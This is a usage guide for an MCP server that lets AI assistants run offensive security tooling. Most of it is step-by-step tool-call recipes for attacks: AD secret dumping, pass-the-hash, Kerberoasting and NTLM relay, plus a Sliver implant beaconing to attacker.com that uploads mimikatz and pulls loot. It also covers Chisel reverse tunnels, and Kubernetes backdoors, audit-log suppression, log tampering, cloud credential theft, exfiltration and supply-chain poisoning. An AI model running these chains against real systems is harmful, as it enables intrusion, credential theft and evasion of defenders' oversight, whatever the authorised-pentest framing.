# RedHands MCP Server — Use Cases & How-To Guide

A comprehensive reference for all scenarios, workflows, and configurations supported by the RedHands Model Context Protocol server.

---

## Table of Contents

- [Overview](#overview)
- [Getting Started](#getting-started)
- [Transport Modes](#transport-modes)
- [Authentication](#authentication)
- [Toolset Reference](#toolset-reference)
- [Use Case Scenarios](#use-case-scenarios)
  - [Network Reconnaissance](#1-network-reconnaissance)
  - [Web Application Testing](#2-web-application-testing)
  - [Active Directory Attacks](#3-active-directory-attacks)
  - [Command & Control](#4-command--control)
  - [Tunneling & Pivoting](#5-tunneling--pivoting)
  - [Password Cracking](#6-password-cracking)
  - [Packet Analysis](#7-packet-analysis)
  - [Kubernetes Security](#8-kubernetes-security)
  - [Vulnerability Scanning](#9-vulnerability-scanning)
  - [SQL Injection](#10-sql-injection)
- [Workflow Chaining](#workflow-chaining)
- [Report Generation](#report-generation)
- [Plugin System](#plugin-system)
- [Docker Deployment](#docker-deployment)
- [Configuration Reference](#configuration-reference)
- [Security Considerations](#security-considerations)

---

## Overview

RedHands is an MCP (Model Context Protocol) server that exposes 125 offensive security tools across 15 toolsets to AI assistants via JSON-RPC 2.0. It enables AI-driven penetration testing, red team operations, and security assessments through a standardized protocol.

**Key Features:**
- 125 tools across 15 specialized toolsets
- Zero external Go dependencies (stdlib only)
- Three transport modes: stdio, SSE, WebSocket
- Built-in authentication (API key, mTLS)
- Tool chaining/workflow engine
- Structured output parsing (Nmap XML, Nuclei JSONL, Masscan JSON)
- Report generation (Markdown, HTML)
- JSON-based plugin system for custom tools
- Full audit logging
- Rate limiting and caching
- Docker support with pre-installed security tools

---

## Getting Started

### Installation

#### One-Line Install (Linux/macOS)

```bash
# Install RedHands binary only
curl -fsSL https://raw.githubusercontent.com/yasindce1998/redhands/main/scripts/install.sh | bash

# Install binary + security tools (pick a profile)
curl -fsSL https://raw.githubusercontent.com/yasindce1998/redhands/main/scripts/install.sh | bash -s -- --with-tools --profile=web
```

Available profiles: `minimal`, `web`, `network`, `ad`, `recon`, `all`

#### Build from Source

```bash
git clone https://github.com/yasindce1998/redhands.git
cd redhands
make build
sudo make install

# Install security tool dependencies
sudo make install-tools PROFILE=web    # or: minimal, network, ad, recon, all

# Check which tools are available
make check-deps
```

#### Windows (PowerShell)

```powershell
git clone https://github.com/yasindce1998/redhands.git; cd redhands
go build -o bin\redhands.exe .\cmd\redhands

# Install tool dependencies (requires admin)
.\scripts\install-tools.ps1 -Profile web

# Check installed tools
.\scripts\install-tools.ps1 -Check
```

#### Docker

```bash
docker build -t redhands .
docker run -it redhands
```

The Docker image includes all security tools pre-installed — no additional setup required.

### Installation Profiles

| Profile | Includes | Use Case |
|---------|----------|----------|
| `minimal` | nmap, subfinder, httpx, nuclei | Quick recon and scanning |
| `web` | minimal + ffuf, katana, nikto, sqlmap, feroxbuster, whatweb, testssl | Web application testing |
| `network` | minimal + masscan, rustscan, tshark, chisel, ligolo-ng | Network/infrastructure assessments |
| `ad` | minimal + impacket, certipy, crackmapexec, hashcat, john | Active Directory attacks |
| `recon` | minimal + amass, gau, waybackurls, arjun, whatweb | Deep reconnaissance |
| `all` | Everything | Full offensive toolkit |

### Quick Start with Claude Code

Add to your MCP client configuration:

```json
{
  "mcpServers": {
    "redhands": {
      "command": "redhands",
      "args": []
    }
  }
}
```

### Quick Start with SSE (Remote)

```bash
REDHANDS_TRANSPORT=sse REDHANDS_SSE_ADDR=:8080 redhands
```

Connect from any MCP client supporting SSE transport at `http://localhost:8080/sse`.

---

## Transport Modes

### stdio (Default)

Standard input/output with line-delimited JSON-RPC. Used for local integrations.

```bash
./redhands
# Or explicitly:
REDHANDS_TRANSPORT=stdio ./redhands
```

**Best for:** Claude Code, Cursor, VS Code extensions, local AI assistants.

### SSE (Server-Sent Events)

HTTP-based transport for remote access.

```bash
REDHANDS_TRANSPORT=sse REDHANDS_SSE_ADDR=:8080 ./redhands
```

**Endpoints:**
| Endpoint | Method | Description |
|----------|--------|-------------|
| `/sse` | GET | Event stream (text/event-stream) |
| `/message` | POST | Send JSON-RPC requests (requires `clientId` query param) |
| `/health` | GET | Health check |

**Best for:** Remote access, team shared servers, web-based clients.

### WebSocket

Full-duplex communication over WebSocket (RFC 6455).

```bash
REDHANDS_TRANSPORT=ws REDHANDS_WS_ADDR=:8081 ./redhands
```

**Endpoints:**
| Endpoint | Description |
|----------|-------------|
| `/ws` | WebSocket upgrade endpoint |
| `/health` | Health check |

**Best for:** Real-time bidirectional communication, browser-based clients.

---

## Authentication

### No Authentication (Default)

```bash
REDHANDS_AUTH=none ./redhands
```

### API Key

```bash
REDHANDS_AUTH=apikey REDHANDS_API_KEY=your-secret-key REDHANDS_TRANSPORT=sse ./redhands
```

Clients authenticate via:
- HTTP header: `X-API-Key: your-secret-key`
- Query parameter: `?api_key=your-secret-key`

### Mutual TLS (mTLS)

```bash
REDHANDS_AUTH=mtls \
  REDHANDS_TLS_CERT=/path/to/server.crt \
  REDHANDS_TLS_KEY=/path/to/server.key \
  REDHANDS_TLS_CA=/path/to/ca.crt \
  REDHANDS_TRANSPORT=sse ./redhands
```

Clients must present a certificate signed by the specified CA.

---

## Toolset Reference

### Enabling/Disabling Toolsets

By default, all toolsets are enabled. To enable only specific ones:

```bash
REDHANDS_TOOLSETS=nmap,recon,web ./redhands
```

### Available Toolsets

| Toolset | Tools | Category |
|---------|-------|----------|
| `nmap` | 4 | Network Scanning |
| `recon` | 6 | Reconnaissance |
| `web` | 5 | Web Application |
| `fuzz` | 3 | Fuzzing/Brute-force |
| `scan` | 2 | Port Scanning |
| `exploit` | 1 | Exploitation |
| `vuln` | 1 | Vulnerability Scanning |
| `impacket` | 8 | Active Directory |
| `sliver` | 9 | Command & Control |
| `tunnel` | 5 | Tunneling/Pivoting |
| `crack` | 6 | Password Cracking |
| `crackmapexec` | 5 | Network Exploitation |
| `certipy` | 6 | AD Certificate Services |
| `tshark` | 5 | Packet Analysis |
| `kubedagger` | 57 | Kubernetes Offense |

---

## Use Case Scenarios

### 1. Network Reconnaissance

#### Scenario: External Attack Surface Discovery

**Objective:** Map an organization's external-facing assets from a domain name.

```
Step 1: Enumerate subdomains
Tool: subfinder_enum
Params: { "domain": "target.com", "sources": "all", "recursive": true }

Step 2: Probe live hosts
Tool: httpx_probe
Params: { "target": "subdomains.txt", "status_code": true, "title": true, "tech_detect": true }

Step 3: Port scan discovered hosts
Tool: nmap_port_scan
Params: { "target": "10.0.0.1-10", "ports": "1-1000", "scan_type": "syn" }

Step 4: Service version detection
Tool: nmap_service_detect
Params: { "target": "10.0.0.1", "ports": "80,443,8080,8443" }
```

#### Scenario: Internal Network Mapping

```
Step 1: Fast port discovery
Tool: rustscan_scan
Params: { "target": "192.168.1.0/24", "ports": "1-65535" }

Step 2: Mass scan for speed
Tool: masscan_scan
Params: { "target": "10.0.0.0/8", "ports": "21,22,80,443,445,3389,8080", "rate": "10000" }

Step 3: OS fingerprinting
Tool: nmap_os_detect
Params: { "target": "192.168.1.100" }
```

#### Scenario: DNS Intelligence Gathering

```
Tool: dns_lookup
Params: { "target": "target.com", "type": "ANY" }

Tool: dns_lookup
Params: { "target": "target.com", "type": "MX" }

Tool: dns_lookup (zone transfer attempt)
Params: { "target": "target.com", "type": "AXFR", "server": "ns1.target.com" }
```

#### Scenario: URL Discovery from Archives

```
Tool: waybackurls
Params: { "domain": "target.com" }

Tool: gau_urls
Params: { "domain": "target.com", "providers": "wayback,otx,commoncrawl,urlscan" }
```

---

### 2. Web Application Testing

#### Scenario: Full Web Application Assessment

```
Step 1: Technology fingerprinting
Tool: whatweb_fingerprint
Params: { "target": "https://target.com" }

Step 2: Directory brute-force
Tool: ffuf_fuzz
Params: { "url": "https://target.com/FUZZ", "wordlist": "/usr/share/wordlists/dirb/common.txt", "mc": "200,301,302,403" }

Step 3: Recursive content discovery
Tool: feroxbuster_scan
Params: { "url": "https://target.com", "wordlist": "/usr/share/wordlists/dirb/common.txt", "depth": 3 }

Step 4: Crawl for endpoints
Tool: katana_crawl
Params: { "target": "https://target.com", "depth": 3, "js_crawl": true }

Step 5: Vulnerability scanning
Tool: nikto_scan
Params: { "target": "https://target.com" }

Step 6: TLS/SSL analysis
Tool: testssl_scan
Params: { "target": "target.com:443" }
```

#### Scenario: Parameter Discovery

```
Tool: arjun_discover
Params: { "url": "https://target.com/api/search", "method": "GET" }
```

#### Scenario: Virtual Host Enumeration

```
Tool: gobuster_dir
Params: { "url": "https://target.com", "wordlist": "/usr/share/wordlists/vhosts.txt", "mode": "vhost" }
```

#### Scenario: Web Fuzzing for Hidden Parameters

```
Tool: ffuf_fuzz
Params: { "url": "https://target.com/api?FUZZ=test", "wordlist": "/usr/share/wordlists/params.txt", "fs": "4242" }
```

---

### 3. Active Directory Attacks

#### Scenario: Domain Enumeration & Credential Harvesting

```
Step 1: Enumerate AD with CrackMapExec
Tool: cme_smb
Params: { "target": "192.168.1.10", "username": "user", "password": "pass", "action": "enum" }

Step 2: LDAP enumeration
Tool: cme_ldap
Params: { "target": "dc01.corp.local", "username": "user", "password": "pass", "action": "users" }

Step 3: Dump secrets
Tool: impacket_secretsdump
Params: { "target": "192.168.1.10", "username": "admin", "password": "P@ssw0rd", "domain": "corp.local" }
```

#### Scenario: Kerberos Attacks

```
Step 1: AS-REP Roasting (get TGT for users without pre-auth)
Tool: impacket_get_tgt
Params: { "target": "dc01.corp.local", "username": "svc_account", "domain": "corp.local", "no_preauth": true }

Step 2: Kerberoasting (get service ticket for offline cracking)
Tool: impacket_get_st
Params: { "target": "dc01.corp.local", "username": "user", "password": "pass", "domain": "corp.local", "spn": "MSSQLSvc/db.corp.local:1433" }

Step 3: Crack the ticket
Tool: hashcat_crack
Params: { "hash_file": "/tmp/ticket.hash", "hash_type": "13100", "wordlist": "/usr/share/wordlists/rockyou.txt" }
```

#### Scenario: Lateral Movement

```
Option A: PsExec-style
Tool: impacket_psexec
Params: { "target": "192.168.1.20", "username": "admin", "hashes": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0", "domain": "corp.local", "command": "whoami" }

Option B: WMI (stealthier)
Tool: impacket_wmiexec
Params: { "target": "192.168.1.20", "username": "admin", "password": "P@ssw0rd", "domain": "corp.local", "command": "ipconfig /all" }

Option C: DCOM
Tool: impacket_dcomexec
Params: { "target": "192.168.1.20", "username": "admin", "password": "P@ssw0rd", "domain": "corp.local", "command": "whoami", "object": "MMC20" }
```

#### Scenario: Pass-the-Hash

```
Tool: cme_smb
Params: { "target": "192.168.1.0/24", "username": "admin", "hashes": "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0", "action": "exec", "command": "whoami" }
```

#### Scenario: NTLM Relay Attack

```
Tool: impacket_ntlmrelay
Params: { "target": "smb://192.168.1.20", "smb2support": true }
```

#### Scenario: SMB Share Enumeration

```
Tool: impacket_smbclient
Params: { "target": "192.168.1.10", "username": "user", "password": "pass", "domain": "corp.local" }
```

---

### 4. Command & Control

#### Scenario: Deploy Sliver C2 Infrastructure

```
Step 1: Start a listener
Tool: sliver_listeners
Params: { "action": "start", "protocol": "mtls", "host": "0.0.0.0", "port": "8888" }

Step 2: Generate an implant
Tool: sliver_generate
Params: { "os": "windows", "arch": "amd64", "format": "exe", "mtls": "attacker.com:8888", "mode": "beacon", "interval": "30s", "jitter": "10s" }

Step 3: List active sessions
Tool: sliver_sessions
Params: { "action": "list" }

Step 4: Execute command on target
Tool: sliver_execute
Params: { "session_id": "abc123", "command": "whoami /all" }

Step 5: Upload a tool
Tool: sliver_upload
Params: { "session_id": "abc123", "local_path": "/tools/mimikatz.exe", "remote_path": "C:\\Windows\\Temp\\m.exe" }

Step 6: Download loot
Tool: sliver_download
Params: { "session_id": "abc123", "remote_path": "C:\\Users\\admin\\Desktop\\secrets.kdbx", "local_path": "/loot/secrets.kdbx" }
```

#### Scenario: Pivoting Through Compromised Hosts

```
Step 1: Set up pivot on compromised host
Tool: sliver_pivot
Params: { "session_id": "abc123", "action": "start", "type": "tcp", "bind_port": "9999" }

Step 2: Port forward to internal service
Tool: sliver_portfwd
Params: { "session_id": "abc123", "action": "add", "remote_host": "192.168.1.50", "remote_port": "3389", "local_port": "13389" }
```

---

### 5. Tunneling & Pivoting

#### Scenario: Chisel Reverse Tunnel

```
Step 1: Start Chisel server on attacker machine
Tool: chisel_server
Params: { "port": "8000", "reverse": true }

Step 2: Connect client from compromised host
Tool: chisel_client
Params: { "server": "attacker.com:8000", "remotes": ["R:socks"] }
```

#### Scenario: Chisel Port Forward

```
Tool: chisel_client
Params: { "server": "attacker.com:8000", "remotes": ["9090:192.168.1.50:3389"] }
```

#### Scenario: Ligolo-ng Network Pivoting

```
Step 1: Start Ligolo proxy
Tool: ligolo_start
Params: { "listen_addr": "0.0.0.0:11601" }

Step 2: Add route to internal subnet
Tool: ligolo_route
Params: { "action": "add", "network": "10.10.0.0/24" }

Step 3: Set up listener on agent for reverse connections
Tool: ligolo_listener
Params: { "action": "add", "addr": "0.0.0.0:4444", "to": "127.0.0.1:4444" }
```

---

### 6. Password Cracking

#### Scenario: Crack NTLM Hashes from SecretsDump

```
Tool: hashcat_crack
Params: { "hash_file": "/tmp/ntlm.txt", "hash_type": "1000", "wordlist": "/usr/share/wordlists/rockyou.txt", "rules": "best64" }
```

#### Scenario: Crack Kerberos Tickets (Kerberoast)

```
Tool: hashcat_crack
Params: { "hash_file": "/tmp/krb5tgs.txt", "hash_type": "13100", "wordlist": "/usr/share/wordlists/rockyou.txt" }
```

#### Scenario: John the Ripper with Auto-Detection

```
Tool: john_crack
Params: { "hash_file": "/tmp/hashes.txt", "wordlist": "/usr/share/wordlists/rockyou.txt" }
```

#### Scenario: Show Previously Cracked

```
Tool: hashcat_show
Params: { "hash_file": "/tmp/ntlm.txt", "hash_type": "1000" }

Tool: john_show
Params: { "hash_file": "/tmp/hashes.txt" }
```

#### Scenario: Benchmark Available Hardware

```
Tool: hashcat_benchmark
Params: { "hash_type": "1000" }
```

#### Scenario: Check Supported Hash Formats

```
Tool: john_formats
Params: { "filter": "krb" }
```

---

### 7. Packet Analysis

#### Scenario: Capture Traffic for Analysis

```
Tool: tshark_capture
Params: { "interface": "eth0", "filter": "host 192.168.1.100", "duration": "60", "output": "/tmp/capture.pcap" }
```

#### Scenario: Analyze Existing Capture

```
Step 1: Read with display filter
Tool: tshark_read
Params: { "file": "/tmp/capture.pcap", "display_filter": "http.request" }

Step 2: Protocol statistics
Tool: tshark_stats
Params: { "file": "/tmp/capture.pcap", "type": "conv" }

Step 3: Extract credentials
Tool: tshark_extract
Params: { "file": "/tmp/capture.pcap", "fields": "http.authbasic,http.cookie,http.request.uri" }

Step 4: Follow a TCP stream
Tool: tshark_follow
Params: { "file": "/tmp/capture.pcap", "protocol": "tcp", "stream": "0" }
```

#### Scenario: Monitor for Specific Traffic Patterns

```
Tool: tshark_capture
Params: { "interface": "any", "filter": "tcp port 445 or tcp port 135", "count": "1000" }
```

---

### 8. Kubernetes Security

#### Scenario: Cluster Enumeration & Persistence

```
Step 1: Discover cluster resources
Tool: kubedagger_k8s_discover
Params: { "namespace": "default" }

Step 2: Harvest service account tokens
Tool: kubedagger_sa_token
Params: { "namespace": "kube-system" }

Step 3: Exploit RBAC misconfigurations
Tool: kubedagger_k8s_abuse
Params: { "action": "privesc", "namespace": "default" }

Step 4: Deploy persistent backdoor
Tool: kubedagger_daemonset
Params: { "namespace": "kube-system", "image": "alpine:latest" }
```

#### Scenario: Container Escape

```
Tool: kubedagger_escape
Params: { "technique": "auto" }
```

#### Scenario: Network Policy Bypass

```
Tool: kubedagger_net_bypass
Params: { "target_ip": "10.96.0.1", "target_port": "443" }
```

#### Scenario: Covert C2 Channels in Kubernetes

```
Option A: DNS-over-HTTPS C2
Tool: kubedagger_doh_c2
Params: { "resolver": "https://dns.google/dns-query", "domain": "c2.attacker.com" }

Option B: Kubernetes Events as C2
Tool: kubedagger_k8s_event_c2
Params: { "namespace": "default" }

Option C: Container log steganography
Tool: kubedagger_container_log_c2
Params: { "pod": "app-pod", "namespace": "default" }
```

#### Scenario: Evade Security Tools

```
Step 1: Detect honeypots
Tool: kubedagger_honeypot_detect
Params: {}

Step 2: Evade Falco/Tetragon
Tool: kubedagger_evasion
Params: { "target": "falco" }

Step 3: Suppress audit logs
Tool: kubedagger_audit_filter
Params: { "filter_user": "attacker" }

Step 4: Tamper with logs
Tool: kubedagger_log_tamper
Params: { "process": "kubelet", "pattern": "suspicious-activity" }
```

#### Scenario: Cloud Identity Theft

```
Step 1: Access cloud metadata
Tool: kubedagger_cloud_meta
Params: { "provider": "aws" }

Step 2: Steal pod identity
Tool: kubedagger_pod_identity
Params: { "provider": "aws", "namespace": "default" }

Step 3: Exfiltrate to cloud storage
Tool: kubedagger_cloud_exfil
Params: { "provider": "aws", "bucket": "exfil-bucket", "data_path": "/etc/kubernetes/pki" }
```

#### Scenario: Supply Chain Attack

```
Step 1: Bypass image signatures
Tool: kubedagger_sig_bypass
Params: {}

Step 2: Manipulate images in transit
Tool: kubedagger_supply_chain
Params: { "action": "inject", "image": "nginx:latest" }

Step 3: Poison GitOps controller
Tool: kubedagger_gitops_poison
Params: { "controller": "argocd" }
```

#### Scenario: Cryptographic Key Theft

```
Step 1: Access kernel keyring
Tool: kubedagger_keyring
Params: {}

Step 2: Harvest secrets from volume mounts
Tool: kubedagger_secrets_harvest
Params: { "namespace": "default" }

Step 3: Steal etcd secrets
Tool: kubedagger_etcd_steal
Params: {}
```

#### Scenario: Network Attacks Within Cluster

```
Step 1: ARP spoofing between pods
Tool: kubedagger_arp_spoof
Params: { "target_ip": "10.244.0.5", "gateway_ip": "10.244.0.1" }

Step 2: TLS interception
Tool: kubedagger_tls_intercept
Params: { "target_process": "nginx" }

Step 3: Veth pair hijacking
Tool: kubedagger_veth_hijack
Params: { "target_pod": "app-pod" }

Step 4: Service mesh bypass
Tool: kubedagger_mesh_bypass
Params: { "mesh": "istio" }
```

---

### 9. Vulnerability Scanning

#### Scenario: Template-Based Vulnerability Scan

```
Tool: nuclei_scan
Params: { "target": "https://target.com", "severity": "critical,high", "tags": "cve" }
```

#### Scenario: Nmap NSE Vulnerability Scanning

```
Tool: nmap_vuln_scan
Params: { "target": "192.168.1.100", "ports": "80,443,8080" }
```

#### Scenario: AD Certificate Services Vulnerabilities

```
Step 1: Find vulnerable templates
Tool: certipy_find
Params: { "target": "dc01.corp.local", "username": "user", "password": "pass", "domain": "corp.local" }

Step 2: Request certificate with vulnerable template (ESC1)
Tool: certipy_req
Params: { "target": "ca.corp.local", "username": "user", "password": "pass", "domain": "corp.local", "template": "VulnTemplate", "upn": "admin@corp.local" }

Step 3: Authenticate with forged certificate
Tool: certipy_auth
Params: { "pfx": "/tmp/admin.pfx", "domain": "corp.local", "dc_ip": "192.168.1.10" }
```

#### Scenario: Golden Certificate Attack

```
Step 1: Forge certificate with stolen CA key
Tool: certipy_forge
Params: { "ca_pfx": "/tmp/ca.pfx", "upn": "admin@corp.local", "domain": "corp.local" }

Step 2: Authenticate
Tool: certipy_auth
Params: { "pfx": "/tmp/forged.pfx", "domain": "corp.local", "dc_ip": "192.168.1.10" }
```

#### Scenario: Shadow Credentials Attack

```
Tool: certipy_shadow
Params: { "target": "dc01.corp.local", "username": "user", "password": "pass", "domain": "corp.local", "account": "victim_user" }
```

---

### 10. SQL Injection

#### Scenario: Automated SQL Injection Testing

```
Tool: sqlmap_scan
Params: { "url": "https://target.com/page?id=1", "level": 3, "risk": 2, "dbs": true }
```

#### Scenario: POST-Based SQL Injection

```
Tool: sqlmap_scan
Params: { "url": "https://target.com/login", "data": "username=admin&password=test", "level": 5, "risk": 3 }
```

---

## Workflow Chaining

The workflow engine allows chaining multiple tools together with variable substitution between steps.

### MCP Method: `workflow/run`

```json
{
  "jsonrpc": "2.0",
  "method": "workflow/run",
  "id": 1,
  "params": {
    "steps": [
      {
        "tool": "nmap_port_scan",
        "params": { "target": "10.0.0.1", "ports": "1-1000" }
      },
      {
        "tool": "nuclei_scan",
        "params": { "target": "$prev.text" }
      }
    ]
  }
}
```

### Variable Substitution

| Variable | Description |
|----------|-------------|
| `$prev.text` | Text output from the immediately preceding step |
| `$step[0].text` | Text output from step 0 (zero-indexed) |
| `$step[1].text` | Text output from step 1 |
| `$step[N].text` | Text output from step N |

### Example Workflows

#### Recon-to-Vuln Pipeline

```json
{
  "steps": [
    { "tool": "subfinder_enum", "params": { "domain": "target.com" } },
    { "tool": "httpx_probe", "params": { "target": "$prev.text" } },
    { "tool": "nuclei_scan", "params": { "target": "$prev.text", "severity": "critical,high" } }
  ]
}
```

#### Port Scan to Service Detection

```json
{
  "steps": [
    { "tool": "masscan_scan", "params": { "target": "10.0.0.0/24", "ports": "1-65535", "rate": "10000" } },
    { "tool": "nmap_service_detect", "params": { "target": "$prev.text" } }
  ]
}
```

#### AD Attack Chain

```json
{
  "steps": [
    { "tool": "cme_ldap", "params": { "target": "dc01.corp.local", "username": "user", "password": "pass", "action": "kerberoastable" } },
    { "tool": "impacket_get_st", "params": { "target": "dc01.corp.local", "username": "user", "password": "pass", "domain": "corp.local", "spn": "$prev.text" } },
    { "tool": "hashcat_crack", "params": { "hash_file": "$prev.text", "hash_type": "13100", "wordlist": "/usr/share/wordlists/rockyou.txt" } }
  ]
}
```

---

## Report Generation

Generate formatted reports from tool results.

### MCP Method: `report/generate`

```json
{
  "jsonrpc": "2.0",
  "method": "report/generate",
  "id": 1,
  "params": {
    "title": "Penetration Test Report - Target Corp",
    "format": "markdown",
    "sections": [
      {
        "title": "Network Reconnaissance",
        "tool": "nmap_port_scan",
        "content": "<tool output text>"
      },
      {
        "title": "Vulnerability Assessment",
        "tool": "nuclei_scan",
        "content": "<tool output text>"
      }
    ]
  }
}
```

### Supported Formats

| Format | Output |
|--------|--------|
| `markdown` | Structured `.md` with table of contents, headings, and tool attribution |
| `html` | Self-contained HTML page with inline CSS, navigation TOC, code blocks |

---

## Plugin System

Extend RedHands with custom tools defined in JSON files.

### Creating a Plugin

Create a `.json` file in the plugins directory (default: `./plugins/`):

```json
{
  "name": "custom_quick_scan",
  "description": "Quick top-100 port scan",
  "binary": "nmap",
  "args_template": ["-sS", "--top-ports", "100", "-T4", "{{.target}}"],
  "input_schema": {
    "type": "object",
    "properties": {
      "target": {
        "type": "string",
        "description": "Target IP or hostname"
      }
    },
    "required": ["target"]
  }
}
```

### Plugin Fields

| Field | Required | Description |
|-------|----------|-------------|
| `name` | Yes | Unique tool name (appears in `tools/list`) |
| `description` | Yes | One-line description |
| `binary` | Yes | Executable name (must exist on PATH) |
| `args_template` | Yes | Go `text/template` arguments |
| `input_schema` | Yes | JSON Schema for input validation |

### Template Variables

Use `{{.field_name}}` in `args_template` to reference input parameters:

```json
{
  "name": "custom_nmap_script",
  "description": "Run a specific NSE script",
  "binary": "nmap",
  "args_template": ["--script", "{{.script}}", "-p", "{{.ports}}", "{{.target}}"],
  "input_schema": {
    "type": "object",
    "properties": {
      "target": { "type": "string", "description": "Target host" },
      "script": { "type": "string", "description": "NSE script name" },
      "ports": { "type": "string", "description": "Port range" }
    },
    "required": ["target", "script"]
  }
}
```

### Example Plugins

#### SSH Brute-Force (Hydra)

```json
{
  "name": "hydra_ssh",
  "description": "SSH brute-force with Hydra",
  "binary": "hydra",
  "args_template": ["-l", "{{.username}}", "-P", "{{.wordlist}}", "{{.target}}", "ssh"],
  "input_schema": {
    "type": "object",
    "properties": {
      "target": { "type": "string", "description": "Target IP" },
      "username": { "type": "string", "description": "Username to test" },
      "wordlist": { "type": "string", "description": "Password wordlist path" }
    },
    "required": ["target", "username", "wordlist"]
  }
}
```

#### Custom Reverse Shell Listener

```json
{
  "name": "nc_listener",
  "description": "Start a netcat listener",
  "binary": "nc",
  "args_template": ["-lvnp", "{{.port}}"],
  "input_schema": {
    "type": "object",
    "properties": {
      "port": { "type": "string", "description": "Listening port" }
    },
    "required": ["port"]
  }
}
```

---

## Docker Deployment

### Basic Usage

```bash
# Build the image
docker build -t redhands .

# Run with stdio (interactive)
docker run -it redhands

# Run with SSE transport
docker run -d -p 8080:8080 -e REDHANDS_TRANSPORT=sse redhands

# Run with WebSocket transport
docker run -d -p 8081:8081 -e REDHANDS_TRANSPORT=ws redhands
```

### Docker Compose

```bash
# Start default service (SSE on 8080, WS on 8081)
docker compose up redhands

# Start secure service (API key auth on 8443)
docker compose --profile secure up redhands-secure
```

### Pre-Installed Tools in Docker Image

| Category | Tools |
|----------|-------|
| Network | nmap, masscan, tshark |
| Password | hashcat, john |
| Web | whatweb, nikto |
| Python | impacket, certipy-ad |
| Go-based | subfinder, httpx, nuclei, ffuf, katana, gobuster, gau |
| Tunneling | chisel v1.11.5, ligolo-ng v0.8.3 |

### Custom Plugins with Docker

```bash
docker run -d \
  -p 8080:8080 \
  -v ./my-plugins:/opt/redhands/plugins:ro \
  -e REDHANDS_TRANSPORT=sse \
  redhands
```

### Docker with Authentication

```bash
docker run -d \
  -p 8080:8080 \
  -e REDHANDS_TRANSPORT=sse \
  -e REDHANDS_AUTH=apikey \
  -e REDHANDS_API_KEY=my-secret-key \
  redhands
```

---

## Configuration Reference

| Variable | Default | Description |
|----------|---------|-------------|
| `REDHANDS_TOOLSETS` | all enabled | Comma-separated list of toolsets to enable |
| `REDHANDS_TIMEOUT` | `5m` | Per-tool execution timeout |
| `REDHANDS_MAX_OUTPUT` | `10485760` (10MB) | Maximum output size per execution |
| `REDHANDS_RATE_LIMIT` | `10` | Requests per second (token bucket refill) |
| `REDHANDS_RATE_BURST` | `20` | Maximum burst capacity |
| `REDHANDS_CACHE_TTL` | `5m` | Result cache time-to-live |
| `REDHANDS_CACHE_SIZE` | `100` | Maximum cached results (LRU) |
| `REDHANDS_AUDIT_FILE` | `audit.jsonl` | Audit log file path |
| `REDHANDS_TRANSPORT` | `stdio` | Transport: `stdio`, `sse`, or `ws` |
| `REDHANDS_SSE_ADDR` | `:8080` | SSE listen address |
| `REDHANDS_WS_ADDR` | `:8081` | WebSocket listen address |
| `REDHANDS_PLUGINS_DIR` | `./plugins` | Plugin definitions directory |
| `REDHANDS_AUTH` | `none` | Authentication: `none`, `apikey`, or `mtls` |
| `REDHANDS_API_KEY` | — | API key (required when `auth=apikey`) |
| `REDHANDS_TLS_CERT` | — | TLS certificate file path |
| `REDHANDS_TLS_KEY` | — | TLS private key file path |
| `REDHANDS_TLS_CA` | — | CA certificate for mTLS verification |

---

## Security Considerations

### Built-in Protections

1. **Binary Allowlist** — Only explicitly registered security tools can be executed. Arbitrary command execution is blocked.

2. **Shell Metacharacter Rejection** — All string inputs are validated against shell metacharacters (`;`, `|`, `&`, `` ` ``, `$`, `(`, `)`, `{`, `}`, `<`, `>`, etc.) to prevent command injection.

3. **Input Validation** — Strict format checks for IPs, domains, URLs, ports, and other structured inputs.

4. **Output Size Limits** — Maximum 10MB output per tool execution prevents resource exhaustion.

5. **Execution Timeout** — Configurable timeout (default 5 minutes) prevents hung processes.

6. **Rate Limiting** — Token bucket algorithm prevents abuse (default: 10 req/s, burst 20).

7. **Audit Logging** — Every tool invocation is logged to a JSONL audit file with timestamp, tool name, parameters, and result.

8. **Caching** — LRU cache prevents redundant expensive operations (configurable TTL and size).

### Deployment Recommendations

| Environment | Recommended Config |
|-------------|-------------------|
| Local development | `stdio`, `auth=none` |
| Shared team server | `sse`, `auth=apikey` |
| Production/Red Team | `sse` or `ws`, `auth=mtls`, restricted toolsets |
| CTF/Lab | `stdio` or `sse`, `auth=none`, all toolsets |

### Principle of Least Privilege

Enable only the toolsets needed for your engagement:

```bash
# Web app pentest only
REDHANDS_TOOLSETS=nmap,web,fuzz,vuln,exploit ./redhands

# Internal AD assessment
REDHANDS_TOOLSETS=nmap,scan,impacket,crackmapexec,certipy,crack ./redhands

# Cloud/Kubernetes audit
REDHANDS_TOOLSETS=kubedagger,recon,web ./redhands
```

### Network Isolation

When running with network transports (SSE/WebSocket), bind to specific interfaces:

```bash
# Bind to localhost only
REDHANDS_SSE_ADDR=127.0.0.1:8080 ./redhands

# Bind to VPN interface only
REDHANDS_SSE_ADDR=10.8.0.1:8080 ./redhands
```

---

## Integration Examples

### Claude Code (stdio)

`.claude/mcp.json`:
```json
{
  "mcpServers": {
    "redhands": {
      "command": "/usr/local/bin/redhands",
      "env": {
        "REDHANDS_TOOLSETS": "nmap,recon,web,vuln"
      }
    }
  }
}
```

### VS Code / Cursor (stdio)

MCP settings:
```json
{
  "mcp.servers": {
    "redhands": {
      "command": "redhands",
      "args": [],
      "env": {
        "REDHANDS_TIMEOUT": "10m"
      }
    }
  }
}
```

### Remote Client via SSE

```bash
# Start server
REDHANDS_TRANSPORT=sse REDHANDS_AUTH=apikey REDHANDS_API_KEY=secret ./redhands

# Client connects
curl -H "X-API-Key: secret" http://server:8080/sse
# POST requests to /message?clientId=<id>
```

### Health Check

```bash
curl http://localhost:8080/health
```

Or via MCP:
```json
{"jsonrpc": "2.0", "method": "ping", "id": 1}
```

Or use the built-in tool:
```json
{"jsonrpc": "2.0", "method": "tools/call", "id": 1, "params": {"name": "redhands_health"}}
```
